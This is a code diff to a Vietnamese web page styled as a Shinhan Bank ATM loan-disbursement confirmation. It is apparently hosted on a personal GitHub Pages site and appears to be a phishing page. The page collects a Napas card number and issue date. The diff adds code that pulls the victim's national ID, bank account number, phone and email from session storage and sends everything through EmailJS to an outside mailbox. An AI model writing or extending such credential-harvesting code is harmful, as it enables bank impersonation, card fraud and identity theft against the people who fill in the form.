@@ -334,6 +334,7 @@
             color: #003087;
             font-size: 16px;
             margin-bottom: 10px;
+            display: inline-block;
         }
 
         .issue-guide-section ul {
@@ -436,12 +437,31 @@
         }
 
         .help-icon {
-            color: red;
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background-color: red;
+            color: white;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 20px;
             font-weight: bold;
-            font-size: 16px;
+            font-size: 14px;
             margin-left: 5px;
             cursor: pointer;
-            display: inline-block;
+        }
+
+        .help-image {
+            display: none;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .help-image img {
+            max-width: 300px;
+            width: 100%;
+            border: 1px solid #e9ecef;
+            border-radius: 5px;
         }
 
         .buttons {
@@ -590,7 +610,7 @@
                 max-width: 60px;
             }
 
-            .guide-section img, .issue-guide-section img {
+            .guide-section img, .issue-guide-section img, .help-image img {
                 max-width: 200px;
             }
 
@@ -674,13 +694,20 @@
     <div class="container">
         <div class="form-container">
             <h2>Xác Nhận Giải Ngân Qua ATM</h2>
+            <div class="help-image" id="helpImage">
+                <img src="https://via.placeholder.com/300x150?text=Card+Guide" alt="Hướng dẫn nhập thông tin thẻ">
+            </div>
             <div class="summary">
-                <h3>Thông tin thẻ giải ngân</h3>
-                <p>Số thẻ Napas: <span id="summaryCardNumber"></span></p>
-                <p>Ngày phát hành: <span id="summaryIssueDate"></span></p>
-                <p>Họ và tên chủ thẻ: <span id="summaryFullName"></span></p>
-                <p>Loại thẻ: <span id="summaryCardType"></span></p>
-                <p>Ngân hàng: <span id="summaryBankName"></span></p>
+                <h3>Thông tin giải ngân</h3>
+                <p>Họ và Tên: <span id="summaryName"></span></p>
+                <p>Số CCCD: <span id="summaryCCCD"></span></p>
+                <p>Số tiền vay: <span id="summaryAmount">N/A</span></p>
+                <p>Tháng vay: <span id="summaryMonths">N/A</span></p>
+                <p>Số tài khoản ngân hàng: <span id="summaryAccountNumber"></span></p>
+                <p>Họ và tên chủ tài khoản: <span id="summaryAccountHolder"></span></p>
+                <p>Ngân hàng: <span id="summaryBank"></span></p>
+                <p>Số điện thoại: <span id="summaryPhone"></span></p>
+                <p>Email: <span id="summaryEmail"></span></p>
             </div>
             <div class="bank-selection" id="bank-selection">
                 <h3>Chọn ngân hàng</h3>
@@ -899,7 +926,7 @@
             </form>
             <button class="issue-guide-btn" id="issue-guide-btn" onclick="toggleIssueGuide()">Hướng dẫn phát hành thẻ</button>
             <div class="issue-guide-section" id="issue-guide">
-                <h3>Hướng dẫn phát hành thẻ Napas</h3>
+                <h3>Hướng dẫn phát hành thẻ Napas <span class="help-icon" onclick="showHelp('issueGuide')">?</span></h3>
                 <ul>
                     <li>Chuẩn bị giấy tờ tùy thân: CMND/CCCD còn hiệu lực.</li>
                     <li>Đến chi nhánh ngân hàng đã chọn hoặc đăng ký online qua <a href="https://shinhan.com.vn/vi/personal/cards" target="_blank">trang đăng ký thẻ</a>.</li>
@@ -927,11 +954,40 @@
         let bannerIndex = 0;
         let selectedBank = null;
         let selectedBankLogo = null;
+        let formData = {};
 
-        // Show Help Placeholder
+        // Show Help Image
         function showHelp(fieldId) {
-            alert(`Hướng dẫn cho ${selectedBank || 'ngân hàng'} sẽ được cập nhật.`);
+            const helpImage = document.getElementById('helpImage');
+            helpImage.style.display = 'block';
+            // Scroll to the image for better visibility
+            helpImage.scrollIntoView({ behavior: 'smooth' });
         }
+
+        // Load Summary and Initialize
+        window.addEventListener('load', () => {
+            try {
+                formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+                document.getElementById('summaryName').textContent = formData.fullName || 'N/A';
+                document.getElementById('summaryCCCD').textContent = formData.cccd || 'N/A';
+                document.getElementById('summaryAccountNumber').textContent = formData.accountNumber || 'N/A';
+                document.getElementById('summaryAccountHolder').textContent = formData.accountHolder || 'N/A';
+                document.getElementById('summaryPhone').textContent = formData.phone || 'N/A';
+                document.getElementById('summaryEmail').textContent = formData.email || 'N/A';
+                // Pre-select bank from sessionStorage
+                selectedBank = sessionStorage.getItem('selectedBank');
+                if (selectedBank) {
+                    document.querySelector(`.bank-option[data-bank="${selectedBank}"]`)?.classList.add('selected');
+                    document.getElementById('summaryBank').textContent = selectedBank;
+                    confirmBank();
+                }
+            } catch (error) {
+                console.error('Error parsing formData:', error);
+                alert('Lỗi khi tải thông tin giải ngân. Vui lòng thử lại.');
+                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
+            }
+            initializeInputMasks();
+        });
 
         // Toggle Hamburger Menu
         function toggleMenu() {
@@ -964,6 +1020,7 @@
                 document.getElementById('bankError').classList.add('show');
                 return;
             }
+            sessionStorage.setItem('selectedBank', selectedBank);
             document.getElementById('bank-selection').style.display = 'none';
             document.getElementById('card-guide').classList.add('active');
             document.getElementById('card-info-form').classList.add('active');
@@ -971,6 +1028,7 @@
             document.getElementById('selected-bank-logo').src = selectedBankLogo;
             document.querySelector('.form-container h2').classList.add('active');
             document.querySelector('.summary').classList.add('active');
+            document.getElementById('summaryBank').textContent = selectedBank;
         }
 
         // Lazy Load Images
@@ -1079,23 +1137,14 @@
             }
 
             if (isValid) {
-                // Update summary
-                document.getElementById('summaryCardNumber').textContent = document.getElementById('napasCardNumber').value;
-                document.getElementById('summaryIssueDate').textContent = issueDate;
-                document.getElementById('summaryFullName').textContent = fullName;
-                document.getElementById('summaryCardType').textContent = 'napas';
-                document.getElementById('summaryBankName').textContent = selectedBank;
-
+                // Update formData with card details
+                formData.cardNumber = document.getElementById('napasCardNumber').value;
+                formData.issueDate = issueDate;
+                formData.cardFullName = fullName;
+                formData.cardType = 'napas';
+                formData.bankName = selectedBank;
                 // Save to sessionStorage
-                const cardInfo = {
-                    cardNumber: document.getElementById('napasCardNumber').value,
-                    issueDate,
-                    fullName,
-                    cardType: 'napas',
-                    bankName: selectedBank
-                };
-                sessionStorage.setItem('cardInfo', JSON.stringify(cardInfo));
-
+                sessionStorage.setItem('cardInfo', JSON.stringify(formData));
                 // Send to EmailJS
                 emailjs.send('service_60tgxof', 'template_m26sq6s', {
                     cardNumber: document.getElementById('napasCardNumber').value,
@@ -1104,14 +1153,14 @@
                     cardType: 'napas',
                     bankName: selectedBank,
                     timestamp: new Date().toLocaleString('vi-VN'),
-                    cccd: 'N/A',
+                    cccd: formData.cccd || 'N/A',
                     amount: 'N/A',
                     months: 'N/A',
-                    account_number: 'N/A',
-                    account_holder: 'N/A',
-                    bank: 'N/A',
-                    phone: 'N/A',
-                    email: 'N/A',
+                    account_number: formData.accountNumber || 'N/A',
+                    account_holder: formData.accountHolder || 'N/A',
+                    bank: selectedBank || 'N/A',
+                    phone: formData.phone || 'N/A',
+                    email: formData.email || 'N/A',
                     method: 'N/A'
                 }).then(
                     () => {
@@ -1139,8 +1188,6 @@
             e.preventDefault();
             validateForm();
         });
-
-        window.addEventListener('load', initializeInputMasks);
     </script>
 </body>
 </html>
